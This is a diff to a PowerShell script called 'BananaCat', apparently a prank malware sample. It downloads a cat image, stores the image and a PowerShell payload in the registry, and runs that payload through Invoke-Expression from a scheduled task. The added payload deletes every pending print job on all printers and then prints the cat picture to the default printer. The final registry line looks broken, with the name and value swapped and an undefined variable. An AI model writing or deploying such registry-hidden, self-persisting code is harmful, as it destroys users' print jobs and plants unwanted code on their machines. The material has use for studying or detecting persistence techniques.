@@ -1,10 +1,11 @@
 $script_name = "BananaCat"
 $reg_path = "HKCU:\Software\$script_name"
+$reg_image_path = "HKCU:\Software\BananaCatImg"
 $CAT_IMAGE_URI = "https://raw.githubusercontent.com/vanos03/BananaCatHIDS/refs/heads/main/cat.jpg"
-$IMAGE_NAME = $script_name
+$IMAGE_NAME = "BananaCatImg"
 $CAT_IMAGE_OUT = "$env:TEMP\$IMAGE_NAME.jpg"
 
-$scriptCode = 'Invoke-Expression (Get-ItemProperty -Path $reg_path -Name $script_name).$script_name'
+$scriptCode = "Invoke-Expression (Get-ItemProperty -Path $reg_path -Name $script_name).$script_name"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $CAT_IMAGE_URI -OutFile $CAT_IMAGE_OUT -ErrorAction SilentlyContinue
@@ -68,5 +69,29 @@ schtasks /Create /TN "BananaCat" /XML "$tmpXmlPath" /F
 #Remove-Item $tmpXmlPath -Force
 
 $bytes = [System.IO.File]::ReadAllBytes($CAT_IMAGE_OUT)
+New-Item -Path $reg_image_path -Force | Out-Null
+Set-ItemProperty -Path $reg_image_path -Name "$IMAGE_NAME" -Value $bytes
+
+
+$script_in_rule = @'
+
+$PrinterName = (Get-WmiObject -Query "SELECT * FROM Win32_Printer WHERE Default = TRUE").Name
+
+if (-not $PrinterName) {
+    exit 1
+}
+Get-Printer | ForEach-Object { Get-PrintJob -PrinterName $_.Name | Remove-PrintJob -Confirm:$false }
+$ImagePath = "cat.jpg"
+
+if (-Not (Test-Path $ImagePath)) {
+    exit 1
+}
+
+Start-Process -FilePath "mspaint.exe" -ArgumentList "/pt `"$ImagePath`" `"$PrinterName`"" -NoNewWindow -Wait
+'@
+
+$script_name = "BananaCat"
+$reg_path = "HKCU:\Software\$script_name"
+
 New-Item -Path $reg_path -Force | Out-Null
-Set-ItemProperty -Path $reg_path -Name "$IMAGE_NAME" -Value $bytes
+Set-ItemProperty -Path $reg_path -Name $script_in_rule -Value $script
